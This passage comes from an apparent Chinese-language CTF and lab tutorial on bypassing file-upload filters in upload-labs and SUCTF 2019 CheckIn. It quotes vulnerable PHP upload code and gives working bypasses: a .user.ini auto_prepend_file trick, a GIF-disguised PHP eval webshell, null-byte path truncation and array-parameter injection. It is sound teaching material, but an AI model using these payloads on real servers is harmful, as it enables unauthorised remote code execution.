class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>基本上把除了 <code>.htaccess</code> 文件之外的都枚举了一遍</p>
<p>就按照上面写的，先上传 <code>.htaccess</code> 文件，再上传 webshell .png </p>
<p>注意一个小细节：访问的图片地址不用改后缀：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/aebb7394bcda61455d234e46d55c65c9.png" alt="image-20240507195326574"></p>
<p>蚁剑也是如此：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fcdcf9b36e5e14e7bf458f948f2f21fa.png" alt="image-20240507195926101"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fcd2659cf4711785dd0b593c2f4c3b6f.png" alt="image-20240507195952230"></p>
</li>
<li></li>
<li><p><code>ini</code> 配置文件，常用于 nginx 服务器：</p>
<p>PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件，这样可以在每个目录下单独设置 PHP 的配置信息，而不必依赖全局的 php.ini 文件。这个功能只会被 CGI／FastCGI SAPI 处理。如果使用 Apache，则用 .htaccess 文件有同样效果。</p>
<p>除了 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 .user.ini 风格的 INI 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。除了 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的指令外，也可以使用 <code>PHP_INI_SYSTEM</code> 模式的指令。这些指令会在整个系统范围内生效。</p>
<p>用户可以通过两个新的 INI 指令 <code>user_ini.filename</code> 和 <code>user_ini.cache_ttl</code> 来控制用户 INI 文件的使用。</p>
<p>其中，<code>user_ini.filename</code> 设定了 PHP 会在每个目录下搜寻的文件名，如果设定为空字符串则 PHP 不会搜寻，默认值是 <code>.user.ini</code>。</p>
<p><code>user_ini.cache_ttl</code> 控制着重新读取用户 INI 文件的间隔时间，默认是 300 秒（5 分钟）。</p>
<p>需要注意的是，这个功能并不适用于 CLI 模式下的 PHP。</p>
<p>在使用基于目录的 INI 文件时，需要注意性能问题。如果目录层级较深，或者 <code>user_ini.cache_ttl</code> 设置的时间过短，可能会导致频繁的文件读取，影响性能。可以根据实际情况进行调整。</p>
<p>下面是对 .user.ini 的举例：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=webshell.gif <span class="comment">#先包含 webshell</span></span><br><span class="line"><span class="attr">auto_append_file</span>=webshell.gif <span class="comment">#先访问文件，再包含 webshel</span></span><br></pre></td></tr></table></figure>

<p><code>auto_prepend_file=webshell.gif</code></p>
<ul>
<li>在每个 PHP 脚本执行前自动包含一个名为 <code>webshell.gif</code> 的文件。</li>
<li>当 PHP 脚本执行时，<code>webshell.gif</code> 的文件里面的恶意脚本也会被执行。</li>
</ul>
<p><code>auto_append_file=webshell.gif</code></p>
<ul>
<li>这会在每个 PHP 脚本执行后自动包含 <code>webshell.gif</code> 文件。</li>
<li>这意味着即使原始 PHP 脚本没有问题，最终执行的代码也会执行 <code>webshell.gif</code> 的文件里面的恶意脚本。</li>
</ul>
<p>实例：</p>
<p>[SUCTF 2019]CheckIn</p>
<p>[BUUCTF在线评测 (buuoj.cn)](<a href="https://buuoj.cn/challenges#[SUCTF">https://buuoj.cn/challenges#[SUCTF</a> 2019]CheckIn)</p>
<p>构造 .user.ini 文件：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=webshell.gif</span><br></pre></td></tr></table></figure>

<p>由于有文件头检测。所以要加上 GIF89a 绕过：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=webshell.gif</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/b21d360b8005b3de665d9ae9757eeb03.png" alt="image-20240508162857118"></p>
<p>上传成功：</p>
<img src="https://img-blog.csdnimg.cn/img_convert/d40eaab2d2dbfae6eeb951d057941a69.png" alt="image-20240508163028466"  />

<p>由于有文件内容检测，webshell.gif 的内容为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">echo</span>(<span class="number">123</span>); @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/e70b48579daea3ed21b66ecf36d5d41e.png" alt="image-20240508163525031"></p>
<p>上传成功：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/81169c73bfa771cfd9fc90826ba6ab28.png" alt="image-20240508163859784"></p>
<p>连接蚁剑：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/418e6bbb41b2e8de8b17a4efc9edab4e.png" alt="image-20240508164002022"></p>
<p>成功连接：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/17fe05ec92c96fed1907ce86ae0f80fe.png" alt="image-20240508164137198"><br>得到 flag<br><img src="https://img-blog.csdnimg.cn/img_convert/9e2e09cdbf2f3e0ef7284a3cdc9d4ffc.png" alt="image-20240508164732649"></p>
</li>
</ul>
<h5 id="白名单检测"><a href="#白名单检测" class="headerlink" title="白名单检测"></a>白名单检测</h5><p>白名单：一般情况下，代码文件里会有一个数组或者列表，该数组或者列表里会包含一些合法的字符或者字符串，如果数据包中的文件后缀不符合白名单，就不允许上传。 </p>
<h6 id="如何确认是否是白名单检测"><a href="#如何确认是否是白名单检测" class="headerlink" title="如何确认是否是白名单检测"></a>如何确认是否是白名单检测</h6><p>上传一张图片与一个自己构造的后缀，如果只能上传图片，不能上传其它后缀文件，说明是白名单检测。 </p>
<h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><p>php：php &lt; 5.3.29 且 php.ini 文件中 <code>magic_quotes_gpc=off</code></p>
<p><code>magic_quotes_gpc</code> 可在 phpstudy –&gt; 其他选项菜单 –&gt; PHP 扩展及设置 –&gt; 参数开关设置中关闭。</p>
<p>java：jdk &lt; JDK1.7.0_40</p>
<h6 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h6><ul>
<li><p>get 0x00 截断：</p>
<p>00 截断是操作系统层的漏洞，由于操作系统是 C 语言或汇编语言编写的，这两种语言在定义字符串时，都是以 \0（即 0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到 \0 字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入 \0 字符的方式，达到字符串截断的目的。</p>
<p>0x 表示 16 进制，URL 中 %00 解码成 16 进制就是 0x00 。</p>
<p>实例：</p>
<p>upload-labs Pass-12：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>
<p>中的 <code>save_path</code> 可控<br><img src="https://img-blog.csdnimg.cn/img_convert/46a6078eb10674f7d5a537619c30494e.png" alt="image-20240508101847019"><br>最终我们得到的地址为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/uploadlabs/upload/webshell.php%EF%BF%BD/7020240508101859.png</span><br></pre></td></tr></table></figure>
<p>由于存在截断，所以实际上解析到的地址是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/uploadlabs/upload/webshell.php</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ceedb400ec77154ef04b72ab8753e63a.png" alt="image-20240508102258031"></p>
</li>
<li><p>post 0x00 截断：</p>
<p>实例：</p>
<p>upload-labs Pass-13：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>中的 <code>save_path</code> 可控</p>
<p>但和 GET 对比，需要多做一次解码的工作</p>
<p>GET 型提交的内容会被自动进行 URL 解码，在 POST 请求中，%00 不会被自动解码。</p>
<p>抓包后找到 save_path ，更改值</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7f5e23d36cd9d6ce0bb8e4b092c1d67b.png" alt="image-20240508102822575"><img src="https://img-blog.csdnimg.cn/img_convert/eb5c2dc22ab738b2aa041ef57258a7c3.png" alt="image-20240508103440735"><br>注：编号后字符变为不可见<br><img src="https://img-blog.csdnimg.cn/img_convert/3db6911f9ca0f4dbb56d5c578aeb361c.png" alt="image-20240508102258031"></p>
<ul>
<li><p>数组拼接</p>
<p>实例：</p>
<p>upload-labs Pass-21：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">// mime check</span></span><br><span class="line">            <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// check filename</span></span><br><span class="line">                <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">                <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                    <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>explode()</code> 函数被用来分割文件名:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>这里首先判断是否有 <code>save_name</code> 表单字段提交，如果没有则使用 <code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code> 作为文件名。然后使用 <code>explode()</code> 函数按照 <code>.</code> 符号将文件名分割成一个数组。最后使用 <code>end()</code> 函数获取数组中最后一个元素，即文件扩展名。</p>
<p><code>end()</code> 函数将数组内部指针指向最后一个元素，并返回该元素的值，所以这个函数可以接受数组的。<code>reset()</code> 函数将内部指针指向数组中的第一个元素，并输出，所以这个函数也可以接受数组的。<code>count()</code> 统计数组有多少个元素</p>
<p>最最关键的一点是：<code>$_POST[&#39;save_name&#39;]</code> 可控，那么就可以从这一点入手：</p>
<p>用 post 方法传入如下两个参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">save_name[<span class="number">0</span>]= upload-<span class="number">20</span>.php</span><br><span class="line">save_name[<span class="number">2</span>]= jpg</span><br></pre></td></tr></table></figure>

<p>经过</p>
